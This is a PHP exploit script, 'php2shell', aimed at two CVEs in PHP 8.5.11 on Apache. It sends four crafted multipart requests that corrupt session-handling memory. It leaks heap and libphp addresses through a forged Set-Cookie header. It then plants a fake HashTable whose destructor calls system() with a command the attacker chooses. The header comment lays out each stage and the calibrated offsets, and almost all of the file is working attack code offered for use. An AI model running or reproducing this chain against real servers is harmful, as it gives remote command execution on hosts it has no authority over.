<?php
declare(strict_types=1);

/*
 * php2shell (CVE-2026-109619 / CVE-2026-109618) full-chain trigger, PHP 8.5.11.
 *
 * Requirements on the target:
 *   display_errors=On, output_buffering=0 (headers_sent trigger)
 *   memory_limit=128M, post_max_size>=256M, session.upload_progress.enabled=1
 *   a single prefork worker (all four requests must hit the same process)
 *
 * Stages:
 *   A1: >max_input_vars warning is written to the response -> SG(headers_sent)=1.
 *       The cookie send fails, send_cookie stays 1, initialize aborts and closes
 *       the *valid* ps_files (PS(mod_data)=NULL). A trailing 130MB field OOMs;
 *       the bailout leaves a dangling PS(id) with send_cookie=1.
 *   B1: no file part -> END cleanup initializes with mod_data==NULL (no stale
 *       ps_files close) and sends Set-Cookie from the dangling PS(id), which we
 *       reclaim with a forge raw buffer. The cookie leaks a heap window.
 *       We recover the main chunk base (heap) and zval_ptr_dtor (libphp base).
 *   A2: cheap OOM (nested empty file fields). initialize runs first (track_init
 *       creates PS(http_session_vars) as a reference), s_read fails -> abort,
 *       then the parser OOMs. The reference survives into the next request.
 *   B2: two 384-byte fake-reference sprays. n1 lands on the stale reference
 *       (rc=1, ptr=S), n2 lands on the stale PS(id) (ptr=0 so its length is 0).
 *       track_init destroys the fake reference -> fake HashTable at S with
 *       pDestructor=zif_system -> system(cmd).
 *
 * Offsets calibrated on php:8.5.11-apache (Debian trixie, Apache 2.4.69):
 *   zval_ptr_dtor = libphp + 0x7b47a0, zif_system = libphp + 0x5996e0
 *   stale id = main + 0xa7000, session reference = main + 0x7a720
 *   fake HashTable payload landing = main + 0xF5398
 */

ini_set('memory_limit', '-1');

const BND_A = 'BBBBBBBBBB';
const BND_B = 'BBBBBBBBBB';
const BND_C = 'CCCCCCCCCC';

function p2s_part(string $bnd, string $name, string $value = '', ?string $filename = null, ?string $ctype = null): string {
    $s = '--' . $bnd . "\r\nContent-Disposition: form-data; name=\"$name\"";
    if ($filename !== null) {
        $s .= "; filename=\"$filename\"";
    }
    $s .= "\r\n";
    if ($ctype !== null) {
        $s .= "Content-Type: $ctype\r\n";
    }
    return $s . "\r\n" . $value . "\r\n";
}

function p2s_send(int $port, string $body, string $bnd, int $readCap = 64 << 20, float $timeout = 180.0): string {
    $s = @stream_socket_client('tcp://127.0.0.1:' . $port, $errno, $errstr, 5.0);
    if (!$s) {
        throw new RuntimeException("connect: $errstr ($errno)");
    }
    stream_set_timeout($s, (int) $timeout);
    $h = "POST /index.php HTTP/1.1\r\nHost: 127.0.0.1:$port\r\n"
       . 'Content-Type: multipart/form-data; boundary=' . $bnd . "\r\n"
       . 'Content-Length: ' . strlen($body) . "\r\nConnection: close\r\n\r\n";
    fwrite($s, $h);
    $len = strlen($body);
    for ($o = 0; $o < $len; $o += 262144) {
        fwrite($s, substr($body, $o, 262144));
    }
    $out = '';
    while (!feof($s) && strlen($out) < $readCap) {
        $r = fread($s, 65536);
        if ($r === false || $r === '') {
            break;
        }
        $out .= $r;
    }
    fclose($s);
    return $out;
}

function p2s_setcookie(string $resp): string {
    $head = explode("\r\n\r\n", $resp, 2)[0];
    foreach (explode("\r\n", $head) as $line) {
        if (stripos($line, 'set-cookie:') === 0 && preg_match('/PHPSESSID=([^;]*)/', $line, $m)) {
            return rawurldecode($m[1]);
        }
    }
    return '';
}

/* A1: warning -> headers_sent -> abort with mod_data=NULL, then OOM. */
function p2s_a1(): string {
    $out = '';
    for ($i = 0; $i < 1005; $i++) {
        $out .= p2s_part(BND_A, sprintf('p%04d', $i), 'x');
    }
    $out .= p2s_part(BND_A, 'PHPSESSID', "\0");
    $out .= p2s_part(BND_A, 'PHP_SESSION_UPLOAD_PROGRESS', 'pwn');
    $out .= p2s_part(BND_A, 'f', str_repeat('A', 64), 'a.txt', 'application/octet-stream');
    $out .= p2s_part(BND_A, 'big', str_repeat('B', 130 * 1024 * 1024));
    return $out . '--' . BND_A . "--\r\n";
}

/* B1: reclaim PS(id) and leak a heap window. */
function p2s_b1(): string {
    $out = p2s_part(BND_B, 'PHPSESSID', 'attacksessionid0001');
    $out .= p2s_part(BND_B, 'PHP_SESSION_UPLOAD_PROGRESS', 'pwn');
    for ($i = 0; $i < 841; $i++) {
        $val = substr(sprintf('v%04d', $i) . str_repeat('x', 44), 0, 48);
        $out .= p2s_part(BND_B, (string) (1000 + $i), $val);
    }
    $v = str_repeat('A', 79);
    $v = substr_replace($v, pack('P', 0x158000), 0x10, 8);
    $v = substr_replace($v, 'L', 0x18, 1);
    $out .= p2s_part(BND_B, '1999', $v);
    for ($i = 0; $i < 150; $i++) {
        $out .= p2s_part(BND_B, sprintf('x%05d', $i) . str_repeat('[a]', 12), 'v');
    }
    return $out . '--' . BND_B . "--\r\n";
}

/* A2: initialize runs (track_init sets the reference), s_read aborts, then OOM. */
function p2s_a2(): string {
    $out = p2s_part(BND_C, 'PHPSESSID', str_repeat('a', 32));
    $out .= p2s_part(BND_C, 'PHP_SESSION_UPLOAD_PROGRESS', 'k0');
    for ($i = 0; $i < 115; $i++) {
        $out .= p2s_part(BND_C, sprintf('%03d', $i), 'x');
    }
    for ($i = 0; $i < 880; $i++) {
        $name = sprintf('files[R%05d]', $i) . str_repeat('[a]', 62);
        $out .= '--' . BND_C . "\r\nContent-Disposition: form-data; name=\"$name\"; filename=\"\""
              . "\r\nContent-Type: application/octet-stream\r\n\r\n";
    }
    return $out . '--' . BND_C . "--\r\n";
}

function p2s_fake_ref(int $ptr, int $rc): string {
    return pack('V', $rc) . pack('V', 0x0A) . pack('P', $ptr) . pack('V', 0x0107) . str_repeat("\0", 12);
}

function p2s_spray(int $vl, int $ptr, int $rc): string {
    $v = str_repeat('S', $vl);
    for ($o = 8; $o + 32 <= $vl; $o += 32) {
        $v = substr_replace($v, p2s_fake_ref($ptr, $rc), $o, 32);
    }
    return $v;
}

/* mk_ht.py: fake zend_array + fake execute_data + fake zend_string. */
function p2s_mk_ht(int $S, int $zif, string $cmd, int $size = 384): string {
    $h = str_repeat("\0", $size);
    $w = function (int $off, string $bytes) use (&$h): void {
        $h = substr_replace($h, $bytes, $off, strlen($bytes));
    };
    $w(0x00, pack('V', 1) . pack('V', 7));
    $w(0x08, pack('V', 0x10) . pack('V', 0xFFFFFFF8));
    $w(0x10, pack('P', $S + 0x20));
    $w(0x18, pack('V', 1) . pack('V', 1));
    $w(0x20, pack('V', 8) . pack('V', 0));
    $w(0x28, pack('P', 0));
    $w(0x30, pack('P', $zif));
    $E = 0x20;
    $w($E + 0x00, pack('P', 0));
    $w($E + 0x08, pack('P', 0));
    $w($E + 0x10, pack('P', $zif));
    $w($E + 0x18, pack('P', 0));
    $w($E + 0x20, pack('P', 0));
    $w($E + 0x28, pack('V', 0));
    $w($E + 0x2C, pack('V', 1));
    $w($E + 0x30, pack('P', 0));
    $w($E + 0x38, pack('P', 0));
    $w($E + 0x40, pack('V', 0));
    $w($E + 0x50, pack('P', $S + 0x80));
    $w($E + 0x58, pack('V', 6));
    $w(0x80, pack('V', 1) . pack('V', 0x106));
    $w(0x88, pack('P', 0));
    $w(0x90, pack('P', strlen($cmd)));
    $w(0x98, $cmd . "\0");
    return $h;
}

/* B2: n1 fake refs land on the session reference, n2 on PS(id). */
function p2s_b2(int $n1, int $n2, int $vl, int $ptr1, int $rc1, int $ptr2, int $rc2, string $ht): string {
    $s1 = p2s_spray($vl, $ptr1, $rc1);
    $s2 = p2s_spray($vl, $ptr2, $rc2);
    $out = '';
    for ($i = 0; $i < $n1; $i++) {
        $out .= p2s_part(BND_B, substr(sprintf('s%09d', $i), 0, 10), $s1);
    }
    $out .= p2s_part(BND_B, 'ht', $ht);
    $out .= p2s_part(BND_B, 'PHPSESSID', str_repeat('a', 32));
    $out .= p2s_part(BND_B, 'PHP_SESSION_UPLOAD_PROGRESS', 'pwn');
    for ($i = 0; $i < $n2; $i++) {
        $out .= p2s_part(BND_B, substr(sprintf('t%09d', $i), 0, 10), $s2);
    }
    return $out . '--' . BND_B . "--\r\n";
}

function p2s_bases(string $resp): array {
    $cookie = p2s_setcookie($resp);
    if (strlen($cookie) < 0x1000) {
        throw new RuntimeException('B1: no forged cookie (len=' . strlen($cookie) . ')');
    }
    $counts = [];
    $buckets = [];
    $n = strlen($cookie);
    for ($o = 0; $o + 8 <= $n; $o++) {
        $q = unpack('P', substr($cookie, $o, 8))[1];
        if ($q > 0x700000000000 && $q < 0x800000000000) {
            $k = sprintf('%016x', $q);
            $counts[$k] = ($counts[$k] ?? 0) + 1;
            $b = sprintf('%016x', $q & ~0x1FFFFF);
            $buckets[$b] = ($buckets[$b] ?? 0) + 1;
        }
    }
    if (!$counts || !$buckets) {
        throw new RuntimeException('B1: no pointers in leak');
    }
    arsort($counts);
    arsort($buckets);
    $dtor = 0;
    foreach ($counts as $k => $c) {
        $x = hexdec($k);
        if (($x & 0xFFF) === 0x7a0) {
            $dtor = $x;
            break;
        }
    }
    if (!$dtor) {
        throw new RuntimeException('B1: no zval_ptr_dtor candidate');
    }
    $libphp = $dtor - 0x7b47a0;
    $main = 0;
    foreach ($buckets as $k => $c) {
        $b = hexdec($k);
        if ($c >= 50 && abs($b - $libphp) < 0x4000000) {
            $main = $b;
            break;
        }
    }
    if (($libphp & 0xFFF) !== 0 || $main === 0) {
        throw new RuntimeException(sprintf('implausible bases libphp=%x main=%x', $libphp, $main));
    }
    return [$libphp, $main];
}

function p2s_main(): int {
    global $argv;
    $port = (int) ($argv[1] ?? 8089);
    $cmd = $argv[2] ?? 'id>/out/p1';

    $t0 = microtime(true);
    fwrite(STDERR, "[1/4] A1 headers_sent\n");
    $r = p2s_send($port, p2s_a1(), BND_A);
    fwrite(STDERR, '      status=' . (strtok($r, "\r\n") ?: 'none') . "\n");
    usleep(200000);

    fwrite(STDERR, "[2/4] B1 leak\n");
    $libphp = $main = 0;
    for ($try = 1; $try <= 4; $try++) {
        if ($try > 1) {
            fwrite(STDERR, "      retry A1+B1 ($try/4)\n");
            p2s_send($port, p2s_a1(), BND_A);
            usleep(200000);
        }
        $r = p2s_send($port, p2s_b1(), BND_B);
        try {
            [$libphp, $main] = p2s_bases($r);
            break;
        } catch (Throwable $e) {
            fwrite(STDERR, '      ' . $e->getMessage() . "\n");
        }
        usleep(200000);
    }
    if (!$libphp) {
        throw new RuntimeException('B1 failed after retries');
    }
    $S = $main + 0xF5398;
    $zif = $libphp + 0x5996e0;
    fprintf(STDERR, "      libphp=0x%x main=0x%x S=0x%x zif=0x%x\n", $libphp, $main, $S, $zif);
    usleep(200000);

    fwrite(STDERR, "[3/4] A2 cheap OOM\n");
    p2s_send($port, p2s_a2(), BND_C);
    usleep(200000);

    fwrite(STDERR, "[4/4] B2 fake ref + fake HashTable\n");
    $ht = p2s_mk_ht($S, $zif, $cmd);
    p2s_send($port, p2s_b2(500, 495, 384, $S, 1, 0, 1, $ht), BND_B);
    usleep(500000);
    fprintf(STDERR, "done in %.2fs: %s\n", microtime(true) - $t0, $cmd);
    return 0;
}

try {
    exit(p2s_main());
} catch (Throwable $e) {
    fwrite(STDERR, 'error: ' . $e->getMessage() . "\n");
    exit(1);
}
